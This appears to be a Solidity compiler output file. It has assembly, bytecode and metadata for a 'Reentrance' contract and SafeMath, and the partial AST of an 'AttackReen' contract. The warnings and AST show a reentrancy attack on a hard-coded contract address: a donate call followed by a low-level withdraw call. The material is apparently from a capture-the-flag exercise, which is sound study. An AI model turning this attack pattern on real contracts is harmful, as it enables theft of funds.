											"begin": 640,
											"end": 671,
											"name": "DUP3"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "DUP3"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "SLOAD"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "SUB"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "SWAP3"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "POP"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "POP"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "DUP2"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "SWAP1"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "SSTORE"
										},
										{
											"begin": 640,
											"end": 671,
											"name": "POP"
										},
										{
											"begin": 493,
											"end": 678,
											"name": "POP"
										},
										{
											"begin": 493,
											"end": 678,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 493,
											"end": 678,
											"name": "JUMPDEST"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "POP"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "JUMPDEST"
										},
										{
											"begin": 398,
											"end": 410,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 425,
											"end": 433,
											"name": "DUP1"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 434,
											"end": 438,
											"name": "DUP4"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "AND"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "AND"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "DUP2"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "MSTORE"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "ADD"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "SWAP1"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "DUP2"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "MSTORE"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "ADD"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "KECCAK256"
										},
										{
											"begin": 425,
											"end": 439,
											"name": "SLOAD"
										},
										{
											"begin": 418,
											"end": 439,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 439,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "JUMPDEST"
										},
										{
											"begin": 2748,
											"end": 2755,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2767,
											"end": 2776,
											"name": "DUP1"
										},
										{
											"begin": 2783,
											"end": 2784,
											"name": "DUP3"
										},
										{
											"begin": 2779,
											"end": 2780,
											"name": "DUP5"
										},
										{
											"begin": 2779,
											"end": 2784,
											"name": "ADD"
										},
										{
											"begin": 2767,
											"end": 2784,
											"name": "SWAP1"
										},
										{
											"begin": 2767,
											"end": 2784,
											"name": "POP"
										},
										{
											"begin": 2807,
											"end": 2808,
											"name": "DUP4"
										},
										{
											"begin": 2802,
											"end": 2803,
											"name": "DUP2"
										},
										{
											"begin": 2802,
											"end": 2808,
											"name": "LT"
										},
										{
											"begin": 2802,
											"end": 2808,
											"name": "ISZERO"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "JUMPI"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MLOAD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP3"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SUB"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP3"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "1B"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MLOAD"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP2"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SUB"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP1"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "REVERT"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "JUMPDEST"
										},
										{
											"begin": 2857,
											"end": 2858,
											"name": "DUP1"
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "SWAP2"
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "POP"
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "POP"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "SWAP3"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "SWAP2"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "POP"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "POP"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"balances(address)": "27e235e3",
							"donate(address)": "00362a95",
							"withdraw(uint256)": "2e1a7d4d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"donate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/Reentrance.sol\":\"Reentrance\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Reentrance.sol\":{\"keccak256\":\"0x42df610a7e72fcb18477c47526eff4e80306718231582dccb9fb7d40bc1e73a3\",\"urls\":[\"bzz-raw://22628ea2c4c9510d98b7e5ccce66d67250e8e557015814d1f95af9c4b120739c\",\"dweb:/ipfs/QmPkLo2bsz7pTKM4HUF1S8DbDC9gThg3YuA9qfRUevsCbb\"]},\"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 80,
								"contract": "contracts/Reentrance.sol:Reentrance",
								"label": "balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa26469706673582212206176f0c0ba9b8e0f009294bcb28f20d646dead02a98a0cc1f8c86a73fe5b69be64736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212206176f0c0ba9b8e0f009294bcb28f20d646dead02a98a0cc1f8c86a73fe5b69be64736f6c63430006000033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH2 0x76F0 0xC0 0xBA SWAP12 DUP15 0xF STOP SWAP3 SWAP5 0xBC 0xB2 DUP16 KECCAK256 0xD6 CHAINID 0xDE 0xAD MUL 0xA9 DUP11 0xC 0xC1 0xF8 0xC8 PUSH11 0x73FE5B69BE64736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "630:6594:2:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212206176f0c0ba9b8e0f009294bcb28f20d646dead02a98a0cc1f8c86a73fe5b69be64736f6c63430006000033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH2 0x76F0 0xC0 0xBA SWAP12 DUP15 0xF STOP SWAP3 SWAP5 0xBC 0xB2 DUP16 KECCAK256 0xD6 CHAINID 0xDE 0xAD MUL 0xA9 DUP11 0xC 0xC1 0xF8 0xC8 PUSH11 0x73FE5B69BE64736F6C6343 STOP MOD STOP STOP CALLER ",
							"sourceMap": "630:6594:2:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212206176f0c0ba9b8e0f009294bcb28f20d646dead02a98a0cc1f8c86a73fe5b69be64736f6c63430006000033",
									".code": [
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "ADDRESS"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "EQ"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "MSTORE"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "DUP1"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"formattedMessage": "contracts/AttackReen.sol:14:10: Warning: Unused local variable.\n        (bool success, bytes memory result) = address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100));\n         ^----------^\n",
				"message": "Unused local variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 385,
					"file": "contracts/AttackReen.sol",
					"start": 373
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"formattedMessage": "contracts/AttackReen.sol:14:24: Warning: Unused local variable.\n        (bool success, bytes memory result) = address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100));\n                       ^-----------------^\n",
				"message": "Unused local variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 406,
					"file": "contracts/AttackReen.sol",
					"start": 387
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/AttackReen.sol": {
				"ast": {
					"absolutePath": "contracts/AttackReen.sol",
					"exportedSymbols": {
						"AttackReen": [
							70
						]
					},
					"id": 71,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"absolutePath": "contracts/Reentrance.sol",
							"file": "./Reentrance.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 71,
							"sourceUnit": 153,
							"src": "57:26:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 70,
							"linearizedBaseContracts": [
								70
							],
							"name": "AttackReen",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "6c8ae38c",
									"id": 7,
									"name": "r",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 70,
									"src": "111:76:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Reentrance_$152",
										"typeString": "contract Reentrance"
									},
									"typeName": {
										"contractScope": null,
										"id": 3,
										"name": "Reentrance",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 152,
										"src": "111:10:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Reentrance_$152",
											"typeString": "contract Reentrance"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"hexValue": "307832356339353162614330423134313837313838323264624544303636643746453233304562304330",
												"id": 5,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "number",
												"lValueRequested": false,
												"nodeType": "Literal",
												"src": "144:42:0",
												"subdenomination": null,
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"value": "0x25c951baC0B1418718822dbED066d7FE230Eb0C0"
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											],
											"id": 4,
											"name": "Reentrance",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 152,
											"src": "133:10:0",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_Reentrance_$152_$",
												"typeString": "type(contract Reentrance)"
											}
										},
										"id": 6,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "133:54:0",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Reentrance_$152",
											"typeString": "contract Reentrance"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "aa8c217c",
									"id": 10,
									"name": "amount",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 70,
									"src": "193:28:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 8,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "193:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "31",
										"id": 9,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "214:7:0",
										"subdenomination": "ether",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1000000000000000000_by_1",
											"typeString": "int_const 1000000000000000000"
										},
										"value": "1"
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 29,
										"nodeType": "Block",
										"src": "265:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 25,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 526,
																	"src": "319:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_AttackReen_$70",
																		"typeString": "contract AttackReen"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_AttackReen_$70",
																		"typeString": "contract AttackReen"
																	}
																],
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "311:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 23,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "311:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 26,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "311:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "34303030303030",
																"id": 21,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "302:7:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_4000000_by_1",
																	"typeString": "int_const 4000000"
																},
																"value": "4000000"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_4000000_by_1",
																	"typeString": "int_const 4000000"
																}
															],
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 18,
																		"name": "amount",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 10,
																		"src": "290:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 13,
																			"name": "r",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 7,
																			"src": "275:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Reentrance_$152",
																				"typeString": "contract Reentrance"
																			}
																		},
																		"id": 16,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "donate",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 98,
																		"src": "275:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_payable$_t_address_$returns$__$",
																			"typeString": "function (address) payable external"
																		}
																	},
																	"id": 17,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "value",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "275:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$_t_address_$returns$__$value_$",
																		"typeString": "function (uint256) pure returns (function (address) payable external)"
																	}
																},
																"id": 19,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "275:22:0",
																"tryCall": false,
																"typeDescriptions": {
